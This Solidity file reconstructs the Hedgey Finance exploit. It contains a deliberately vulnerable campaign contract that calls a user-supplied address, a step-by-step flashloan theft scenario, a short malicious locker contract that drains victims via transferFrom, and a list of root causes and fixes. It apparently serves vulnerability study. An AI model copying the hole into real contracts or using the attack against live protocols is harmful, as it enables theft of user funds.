// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * HEDGEY FINANCE EXPLOIT (April 2024)
 * Loss: $44.7 million
 * Attack: Arbitrary External Call via Token Locker Donation
 *
 * Hedgey Finance manages token vesting and claims. The createLockedCampaign
 * function accepted a user-controlled tokenLocker address in the donation
 * parameter. This address was then used in an external call that allowed
 * attackers to call transferFrom on any token where users had approvals.
 */

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);
}

enum TokenLockup {
    Unlocked,
    Locked,
    Vesting
}

struct Campaign {
    address manager;
    address token;
    uint256 amount;
    uint256 end;
    TokenLockup tokenLockup;
    bytes32 root;
}

struct ClaimLockup {
    address tokenLocker;
    uint256 start;
    uint256 cliff;
    uint256 period;
    uint256 periods;
}

struct Donation {
    address tokenLocker;
    uint256 amount;
    uint256 rate;
    uint256 start;
    uint256 cliff;
    uint256 period;
}

contract HedgeyClaimCampaigns {
    mapping(bytes16 => Campaign) public campaigns;

    /**
     * @notice Create a locked campaign with vesting
     * @dev VULNERABILITY: User-controlled tokenLocker address in donation
     */
    function createLockedCampaign(
        bytes16 id,
        Campaign memory campaign,
        ClaimLockup memory claimLockup,
        Donation memory donation
    ) external {
        require(campaigns[id].manager == address(0), "Campaign exists");

        campaigns[id] = campaign;

        if (donation.amount > 0 && donation.tokenLocker != address(0)) {
            // VULNERABILITY 1: User-controlled tokenLocker address
            // Attacker can specify malicious contract address

            // VULNERABILITY 2: Arbitrary external call to user-controlled address
            // Makes call to donation.tokenLocker without validation
            (bool success, ) = donation.tokenLocker.call(
                abi.encodeWithSignature(
                    "createTokenLock(address,uint256,uint256,uint256,uint256,uint256)",
                    campaign.token,
                    donation.amount,
                    donation.start,
                    donation.cliff,
                    donation.rate,
                    donation.period
                )
            );

            // VULNERABILITY 3: Assumed success means tokens were locked
            // But malicious contract can do anything, including token theft
            require(success, "Token lock failed");
        }
    }

    /**
     * @notice Cancel a campaign
     */
    function cancelCampaign(bytes16 campaignId) external {
        require(campaigns[campaignId].manager == msg.sender, "Not manager");
        delete campaigns[campaignId];
    }
}

/**
 * EXPLOIT SCENARIO:
 *
 * 1. Attacker creates malicious "tokenLocker" contract:
 *    - Implements createTokenLock() interface
 *    - But instead of locking tokens, calls transferFrom() on victims
 *    - Contract address: 0x[attacker_contract]
 *
 * 2. Attacker identifies victims with token approvals:
 *    - Users who approved Hedgey for USDC transfers
 *    - Many users had unlimited approvals
 *    - Target victims with large USDC balances
 *
 * 3. Attacker borrows USDC via flashloan:
 *    - Borrows 1.305M USDC from Balancer
 *    - Uses as campaign.amount in call
 *
 * 4. Attacker calls createLockedCampaign():
 *    - Sets donation.tokenLocker = malicious contract address
 *    - Sets donation.amount = flashloan amount
 *    - Campaign.token = USDC address
 *
 * 5. Hedgey calls malicious tokenLocker:
 *    - Calls attackerContract.createTokenLock()
 *    - msg.sender is Hedgey contract
 *
 * 6. Malicious contract executes token theft:
 *    - Instead of locking tokens, calls:
 *      USDC.transferFrom(victim, attacker, victimBalance)
 *    - Transfer succeeds because victim approved Hedgey
 *    - Hedgey is msg.sender, so has approval rights
 *
 * 7. Repeat for multiple victims:
 *    - Drain $44.7M total from many users
 *    - Each user who had approved Hedgey is vulnerable
 *
 * 8. Repay flashloan and profit:
 *    - Return borrowed USDC
 *    - Keep stolen funds
 *
 * Malicious Contract Implementation:
 * ```solidity
 * contract MaliciousLocker {
 *     function createTokenLock(
 *         address token,
 *         uint256 amount,
 *         uint256 start,
 *         uint256 cliff,
 *         uint256 rate,
 *         uint256 period
 *     ) external {
 *         // msg.sender is Hedgey contract with victim approvals
 *         IERC20 tokenContract = IERC20(token);
 *         address victim = 0x[victim_address];
 *         uint256 victimBalance = tokenContract.balanceOf(victim);
 *
 *         // Steal victim's tokens using Hedgey's approval rights
 *         tokenContract.transferFrom(victim, tx.origin, victimBalance);
 *     }
 * }
 * ```
 *
 * Root Causes:
 * - User-controlled address used in external call
 * - No whitelist of approved tokenLocker contracts
 * - Arbitrary external call without validation
 * - Trusting return value without verifying behavior
 * - Users gave unlimited approvals to Hedgey
 * - No validation of tokenLocker contract code
 * - Missing access controls on who can create campaigns
 *
 * Fix:
 * - Whitelist approved tokenLocker contract addresses
 * - Never make external calls to user-provided addresses
 * - Implement contract code verification
 * - Require tokenLocker contracts to be verified/audited
 * - Use proxy pattern with upgradeable approved lockers
 * - Implement approval scoping (Permit2 pattern)
 * - Add maximum approval amounts
 * - Monitor for unusual transferFrom patterns
 * - Implement pause mechanism for suspicious activity
 */
